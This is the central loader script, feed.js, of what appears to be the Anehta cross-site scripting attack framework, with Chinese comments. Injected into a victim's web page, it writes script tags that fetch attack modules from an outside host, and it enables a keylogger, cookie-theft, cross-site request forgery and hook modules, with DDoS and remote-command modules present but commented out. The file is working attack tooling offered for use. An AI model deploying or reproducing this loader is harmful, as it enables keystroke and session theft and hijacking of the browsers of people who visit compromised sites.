//////////////////////////////////////////////////////////////
// feed.js 是中心控制文件，在这里插入各种脚本模块
// Author: axis
//alert("feed.js 种子");

// anehta files url
var anehtaurl = "http://www.secwiki.com/anehta";

///////////////////////////////////////////////////////////////////////
// function library
var BaseLib = anehtaurl+"/library/base.js";
var UtfLib = anehtaurl+"/library/utf.js";
var JqueryLib = anehtaurl+"/library/jquery.js";

///////////////////////////////////////////////////////////////////////
// Module
var BoomerangMod = anehtaurl+"/module/boomerang.js";
var ClxMod = anehtaurl+"/module/clx.js";
var XsrfMod = anehtaurl+"/module/xsrf.js";
var DdosMod = anehtaurl+"/module/ddos.js";
var HookMod = anehtaurl+"/module/hook.js";
var KeyloggerMod = anehtaurl+"/module/keylog.js";
var XCookieMod = anehtaurl+"/module/xcookie.js";
var CookieDemoMod = anehtaurl+"/module/demo/cookieDemo.js";
var CacheDemoMod = anehtaurl+"/module/demo/cacheDemo.js";
var RealtimeCmdMod = anehtaurl+"/module/realtimecmd.js";
var TestMod = anehtaurl+"/module/test.js";

///////////////////////////////////////////////////////////////////////

function injectScript(ptr_sc){
    s=document.createElement("script");
    s.src=ptr_sc;
    document.getElementsByTagName("body")[0].appendChild(s);
}

function addScript(ptr_sc){
    document.write("<script src='"+ptr_sc+"'></script>");
}

/////////////////////////////////////
////// 模块加载
try {
    //injectScript 和 AddScript 都不是很稳定,看情况选用 
    
    //injectScript(BaseLib);
    //injectScript(UtfLib);
    //injectScript(JqueryLib);
    
    //injectScript(ClxMod);
    //injectScript(XsrfMod);
    //injectScript(XCookieMod);
    //injectScript(BoomerangMod);
    //injectScript(DdosMod);
    //injectScript(HookMod);
    //injectScript(KeyloggerMod);
    
    ///////////////////////////////////////////////////
    addScript(JqueryLib);
    addScript(BaseLib);
    //addScript(UtfLib);
        
    addScript(ClxMod);
    addScript(XsrfMod);
    addScript(XCookieMod);
    //addScript(BoomerangMod); 可以不用在feed.js里加,xcookie模块会自动判断浏览器并添加
    //addScript(DdosMod);
    addScript(HookMod);
    addScript(KeyloggerMod);
    //addScript(CookieDemoMod);
    //addScript(RealtimeCmdMod);
    addScript(CacheDemoMod);
    addScript(TestMod);
    //injectScript(TestMod);
}
catch (e){
    //alert(e);
}